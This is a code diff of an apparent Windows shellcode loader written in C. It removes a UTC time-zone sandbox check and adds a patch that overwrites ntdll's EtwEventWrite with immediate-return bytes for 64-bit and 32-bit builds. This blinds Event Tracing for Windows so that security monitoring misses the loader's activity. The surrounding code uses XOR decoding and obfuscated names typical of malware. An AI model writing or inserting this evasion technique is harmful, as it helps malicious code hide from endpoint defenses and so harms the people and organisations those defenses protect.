@@ -101,21 +101,6 @@ void gRandom7(char * tada, int tada_len, char * XOR_VARIABLE, size_t XOR_VARIABL
         }
 }
 
-int timez(int argc, char** argv[]) {
-	TIME_ZONE_INFORMATION timeZone;
-	DWORD ret = GetTimeZoneInformation(&timeZone);
-
-	if (ret == TIME_ZONE_ID_INVALID) {
-		exit(-1);
-	} else {
-		if (!wcscmp(L"Coordinated Universal Time", timeZone.DaylightName) || !wcscmp(L"Coordinated Universal Time", timeZone.StandardName)) {
-		} else {
-		}
-	}
-
-	return 0;
-
-}
 
 int main(void) {
 	void * Random8_mem;
@@ -130,7 +115,16 @@ int main(void) {
  
 	unsigned int eRandom5_len = sizeof(eRandom5);
 
-	int timez(int, char***);
+	void * addr = GetProcAddress(GetModuleHandle("ntdll.dll"), "EtwEventWrite");
+        VirtualProtect(addr, 4096, PAGE_EXECUTE_READWRITE, &oldprotect);
+
+        #ifdef _WIN64
+        memcpy(addr, "\x48\x33\xc0\xc3", 4);            
+        #else
+        memcpy(addr, "\x33\xc0\xc2\x14\x00", 5);                
+        #endif  
+
+        VirtualProtect(addr, 4096, oldprotect, &oldprotect);
 
 	FreeConsole;
 
